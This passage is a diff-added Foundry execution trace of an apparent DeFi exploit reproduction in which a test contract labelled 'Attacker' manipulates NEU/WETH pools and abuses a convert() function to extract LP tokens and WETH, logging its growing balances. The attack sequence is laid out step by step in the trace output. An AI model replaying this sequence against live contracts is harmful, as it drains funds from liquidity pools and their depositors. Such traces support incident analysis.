+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd1c2880ed467fc05441c3899bc2f9050cf20258cbe22473b4d4acfec588c3270: 0xfffffffffffffffffffffffffffffffffffffffffffffffffbd62f96e761ffff → 0xffffffffffffffffffffffffffffffffffffffffffffffd1f59845c8c4bdffff
+    │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x000000000000000000000000000000000000000000000036319fdd5cc6020000 → 0x0000000000000000000000000000000000000000000000082b61f38ea35e0000
+    │   │   │   │   │   │   @ 0x8a7b450b5e7ec9d92645d9ba145a7e38b33eaf5d93cc053683bf3e25f00895f0: 0x0000000000000000000000000000000000000000000000008649718a96199863 → 0x00000000000000000000000000000000000000000000002e8c875b58b8bd9863
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [716] NEU::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 5010997702286527876 [5.01e18]
+    │   │   │   ├─ [529] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 9676390114419906659 [9.676e18], 24962540698053817337183 [2.496e22], 300, 300
+    │   │   │   ├─ [1296] WETH::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 858676390114419906659 [8.586e20]
+    │   │   │   │   └─ ← [Return] 858676390114419906659 [8.586e20]
+    │   │   │   ├─ [1716] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getAmountOut(849000000000000000000 [8.49e20], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 24680401940956399779850 [2.468e22]
+    │   │   │   ├─ [21238] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::swap(0, 24680401940956399779850 [2.468e22], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─ [3503] NEU::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24680401940956399779850 [2.468e22])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 24680401940956399779850 [2.468e22])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000000458aa3dc5f164d84 → 0x00000000000000000000000000000000000000000000053a32ec36c9769a0d8e
+    │   │   │   │   │   │   @ 0x777f26b9ce13b7de2f521e3eb15cf0b0bdbaaf0b4bae72d234a0cc78e2593c50: 0x00000000000000000000000000000000000000000000054938d7cbabc94f055f → 0x00000000000000000000000000000000000000000000000f4b7638beb1cb4555
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 858676390114419906659 [8.586e20]
+    │   │   │   │   │   └─ ← [Return] 858676390114419906659 [8.586e20]
+    │   │   │   │   ├─ [716] NEU::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 282138757097417557333 [2.821e20]
+    │   │   │   │   ├─ [479] 0x6EcCab422D763aC031210895C81787E87B43A652::referrersFeeShare(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 858676390114419906659 [8.586e20]
+    │   │   │   │   │   └─ ← [Return] 858676390114419906659 [8.586e20]
+    │   │   │   │   ├─ emit Sync(reserve0: 858676390114419906659 [8.586e20], reserve1: 282138757097417557333 [2.821e20])
+    │   │   │   │   ├─ emit Swap(sender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, amount0In: 849000000000000000000 [8.49e20], amount1In: 0, amount0Out: 0, amount1Out: 24680401940956399779850 [2.468e22], to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x012c012c00000000054938d7cbabc94f055f0000000000008649718a96199863 → 0x012c012c00000000000f4b7638beb1cb455500000000002e8c875b58b8bd9863
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [716] NEU::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 24685412938658686307726 [2.468e22]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("swap token [WETH,NEU] 849 WETH -> NEU") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [716] NEU::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 24685412938658686307726 [2.468e22]
+    │   │   ├─ [0] console::log("Attacker's NEU token balance: ", 24685412938658686307726 [2.468e22]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 150700000000000000000 [1.507e20]
+    │   │   │   └─ ← [Return] 150700000000000000000 [1.507e20]
+    │   │   ├─ [0] console::log("Attacker's WETH token balance: ", 150700000000000000000 [1.507e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [529] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 858676390114419906659 [8.586e20], 282138757097417557333 [2.821e20], 300, 300
+    │   │   ├─ [0] console::log("LP0 reserve0 amount: ", 858676390114419906659 [8.586e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("LP0 reserve1 amount: ", 282138757097417557333 [2.821e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [529] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 340914987794845576869846 [3.409e23], 66560708590370878620 [6.656e19], 300, 300
+    │   │   ├─ [0] console::log("LP1 reserve0 amount: ", 340914987794845576869846 [3.409e23]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("LP1 reserve1 amount: ", 66560708590370878620 [6.656e19]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [74943] 0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d::convert(7390794092629250793 [7.39e18])
+    │   │   │   ├─ [25293] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d, 7390794092629250793 [7.39e18])
+    │   │   │   │   ├─ emit Transfer(from: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d, value: 7390794092629250793 [7.39e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x68c40a523564ac5dc88f3438a3675feecf87bbdf1f73b02f065f2ba4cb402abd: 0 → 0x00000000000000000000000000000000000000000000000066916011b338d2e9
+    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000000000066916011b338d2e9 → 0
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [529] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 858676390114419906659 [8.586e20], 282138757097417557333 [2.821e20], 300, 300
+    │   │   │   ├─ [389] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 476774712637538175318 [4.767e20]
+    │   │   │   ├─ [426] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]
+    │   │   │   ├─ [529] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 340914987794845576869846 [3.409e23], 66560708590370878620 [6.656e19], 300, 300
+    │   │   │   ├─ [389] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 4759121671008920535185 [4.759e21]
+    │   │   │   ├─ [2426] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3
+    │   │   │   ├─ [480] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::balanceOf(0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d) [staticcall]
+    │   │   │   │   └─ ← [Return] 951992684839607319881 [9.519e20]
+    │   │   │   ├─ [27818] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 951735531148986388193 [9.517e20])
+    │   │   │   │   ├─ emit Transfer(from: 0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d, to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 951735531148986388193 [9.517e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x68c40a523564ac5dc88f3438a3675feecf87bbdf1f73b02f065f2ba4cb402abd: 0x0000000000000000000000000000000000000000000000339b8d6efcfb31bd49 → 0x000000000000000000000000000000000000000000000000039197eb4e242e68
+    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x00000000000000000000000000000000000000000000003397fbd711ad0d8ee1
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit Converted(param0: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 7390794092629250793 [7.39e18], param2: 951735531148986388193 [9.517e20])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("call the convert") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [716] NEU::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 24685412938658686307726 [2.468e22]
+    │   │   ├─ [0] console::log("Attacker's NEU token balance: ", 24685412938658686307726 [2.468e22]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 150700000000000000000 [1.507e20]
+    │   │   │   └─ ← [Return] 150700000000000000000 [1.507e20]
+    │   │   ├─ [0] console::log("Attacker's WETH token balance: ", 150700000000000000000 [1.507e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2601] NEU::approve(0xc873fEcbd354f5A56E00E710B90EF4201db2448d, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x27e292b0c8edbbacd8429313c9ff8a6a0ba1701073ddb2c5416598c8ec767306: 0x000000000000000000000000000000000000000000000000458aa3dc5f164d84 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [37652] 0xc873fEcbd354f5A56E00E710B90EF4201db2448d::swapExactTokensForTokensSupportingFeeOnTransferTokens(24685412938658686307726 [2.468e22], 0, [0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0, 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1690921774 [1.69e9])
+    │   │   │   ├─ [3799] NEU::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, 24685412938658686307726 [2.468e22])
+    │   │   │   │   ├─ emit Transfer(from: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, value: 24685412938658686307726 [2.468e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000053a32ec36c9769a0d8e → 0
+    │   │   │   │   │   @ 0x777f26b9ce13b7de2f521e3eb15cf0b0bdbaaf0b4bae72d234a0cc78e2593c50: 0x00000000000000000000000000000000000000000000000f4b7638beb1cb4555 → 0x0000000000000000000000000000000000000000000005497e626f88286552e3
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 150700000000000000000 [1.507e20]
+    │   │   │   │   └─ ← [Return] 150700000000000000000 [1.507e20]
+    │   │   │   ├─ [529] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 858676390114419906659 [8.586e20], 282138757097417557333 [2.821e20], 300, 300
+    │   │   │   ├─ [716] NEU::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   └─ ← [Return] 24967551695756103865059 [2.496e22]
+    │   │   │   ├─ [1736] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getAmountOut(24685412938658686307726 [2.468e22], NEU: [0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0]) [staticcall]
+    │   │   │   │   └─ ← [Return] 848944294038364919125 [8.489e20]
+    │   │   │   ├─ [21340] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::swap(848944294038364919125 [8.489e20], 0, CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─ [4200] WETH::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 848944294038364919125 [8.489e20])
+    │   │   │   │   │   ├─ [3454] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 848944294038364919125 [8.489e20]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 848944294038364919125 [8.489e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x8a7b450b5e7ec9d92645d9ba145a7e38b33eaf5d93cc053683bf3e25f00895f0: 0x00000000000000000000000000000000000000000000002e8c875b58b8bd9863 → 0x000000000000000000000000000000000000000000000000870f59d17d3b030e
+    │   │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x0000000000000000000000000000000000000000000000082b61f38ea35e0000 → 0x00000000000000000000000000000000000000000000003630d9f515dee09555
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 9732096076054987534 [9.732e18]
+    │   │   │   │   │   └─ ← [Return] 9732096076054987534 [9.732e18]
+    │   │   │   │   ├─ [716] NEU::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 24967551695756103865059 [2.496e22]
+    │   │   │   │   ├─ [479] 0x6EcCab422D763aC031210895C81787E87B43A652::referrersFeeShare(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [716] NEU::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 24967551695756103865059 [2.496e22]
+    │   │   │   │   ├─ emit Sync(reserve0: 9732096076054987534 [9.732e18], reserve1: 24967551695756103865059 [2.496e22])
+    │   │   │   │   ├─ emit Swap(sender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, amount0In: 0, amount1In: 24685412938658686307726 [2.468e22], amount0Out: 848944294038364919125 [8.489e20], amount1Out: 0, to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x012c012c00000000000f4b7638beb1cb455500000000002e8c875b58b8bd9863 → 0x012c012c0000000005497e626f88286552e3000000000000870f59d17d3b030e
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 999644294038364919125 [9.996e20]
+    │   │   │   │   └─ ← [Return] 999644294038364919125 [9.996e20]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("swap token [NEU,WETH]") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 999644294038364919125 [9.996e20]
+    │   │   │   └─ ← [Return] 999644294038364919125 [9.996e20]
+    │   │   ├─ [0] console::log("Attacker's WETH token balance: ", 999644294038364919125 [9.996e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [480] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 951735531148986388193 [9.517e20]
+    │   │   ├─ [0] console::log("Balance of Attacker in CMLT-LP1: ", 951735531148986388193 [9.517e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [25018] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::transfer(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4, 951735531148986388193 [9.517e20])
+    │   │   │   ├─ emit Transfer(from: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4, value: 951735531148986388193 [9.517e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x6df594f5675804c9ead2c549bb21185c0b497e8fcadaff473ca54f63bd128d02: 0 → 0x00000000000000000000000000000000000000000000003397fbd711ad0d8ee1
+    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000000003397fbd711ad0d8ee1 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [108856] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::burn(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [2760] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [staticcall]
+    │   │   │   │   └─ ← [Return] 340914987794845576869846 [3.409e23]
+    │   │   │   ├─ [3296] WETH::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [staticcall]
+    │   │   │   │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 66560708590370878620 [6.656e19]
+    │   │   │   │   └─ ← [Return] 66560708590370878620 [6.656e19]
+    │   │   │   ├─ [513] 0x6EcCab422D763aC031210895C81787E87B43A652::feeInfo() [staticcall]
+    │   │   │   │   └─ ← [Return] 40000 [4e4], 0x6a63830E24f9a2F9C295fB2150107D0390Ed1448
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x6a63830E24f9a2F9C295fB2150107D0390Ed1448, value: 1332907522046320076 [1.332e18])
+    │   │   │   ├─ emit Transfer(from: 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4, to: 0x0000000000000000000000000000000000000000, value: 951735531148986388193 [9.517e20])
+    │   │   │   ├─ [30285] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 68157547064697183305504 [6.815e22])
+    │   │   │   │   ├─ emit Transfer(from: 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4, to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 68157547064697183305504 [6.815e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x48ec72f1eedca31ea814a8d1aa2e931df34fcfb52840ce1d7dcc0c2033d23e7e: 0x00000000000000000000000000000000000000000000483109dc7265011a37d6 → 0x0000000000000000000000000000000000000000000039c235e2ad36a581b8b6
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000000e6ed3f9c52e5b987f20
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [7000] WETH::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13307172728756127953 [1.33e19])
+    │   │   │   │   ├─ [6254] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13307172728756127953 [1.33e19]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4, to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 13307172728756127953 [1.33e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x611ad35fad69abd42556d08df0afe8fb76a5e82fe37a40922f3fe174f0b1e40f: 0x0000000000000000000000000000000000000000000000039bb723cf2758f49c → 0x000000000000000000000000000000000000000000000002e30a90b78112abcb
+    │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x00000000000000000000000000000000000000000000003630d9f515dee09555 → 0x000000000000000000000000000000000000000000000036e986882d8526de26
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [760] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [staticcall]
+    │   │   │   │   └─ ← [Return] 272757440730148393564342 [2.727e23]
+    │   │   │   ├─ [1296] WETH::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 53253535861614750667 [5.325e19]
+    │   │   │   │   └─ ← [Return] 53253535861614750667 [5.325e19]
+    │   │   │   ├─ emit Sync(reserve0: 272757440730148393564342 [2.727e23], reserve1: 53253535861614750667 [5.325e19])
+    │   │   │   ├─ emit Burn(sender: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 68157547064697183305504 [6.815e22], amount1: 13307172728756127953 [1.33e19], to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x6df594f5675804c9ead2c549bb21185c0b497e8fcadaff473ca54f63bd128d02: 0x00000000000000000000000000000000000000000000003397fbd711ad0d8ee1 → 0
+    │   │   │   │   @ 8: 0x012c012c0000000000039bb723cf2758f49c00000000483109dc7265011a37d6 → 0x012c012c000000000002e30a90b78112abcb0000000039c235e2ad36a581b8b6
+    │   │   │   │   @ 0: 0x000000000000000000000000000000000000000000000101fe14a8e016280091 → 0x0000000000000000000000000000000000000000000000ce78984222b31ecf7c
+    │   │   │   │   @ 0x9099228d67f2cac0fa5d2a34c7c210c3ca91a2ffd846816557238d9acdc76166: 0x0000000000000000000000000000000000000000000000000a4be06298979d9c → 0x0000000000000000000000000000000000000000000000001ccb50b6e29bfb68
+    │   │   │   │   @ 11: 0x0000000000000000000000000001041f20b7e4a4ccce57f2336fcfc95004ba95 → 0x0000000000000000000000000000a6be03ca1a229df208a7bc6e462f970b0a52
+    │   │   │   └─ ← [Return] 68157547064697183305504 [6.815e22], 13307172728756127953 [1.33e19]
+    │   │   ├─ [0] console::log("CMLT-LP1 burn amount: ", 68157547064697183305504 [6.815e22], 13307172728756127953 [1.33e19]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [760] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 68157547064697183305504 [6.815e22]
+    │   │   ├─ [0] console::log("Attacker's NEU1 token balance: ", 68157547064697183305504 [6.815e22]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 1012951466767121047078 [1.012e21]
+    │   │   │   └─ ← [Return] 1012951466767121047078 [1.012e21]
+    │   │   ├─ [0] console::log("Attacker's WETH token balance: ", 1012951466767121047078 [1.012e21]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24602] 0x6609BE1547166D1C4605F3A243FDCFf467e600C3::approve(0xc873fEcbd354f5A56E00E710B90EF4201db2448d, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
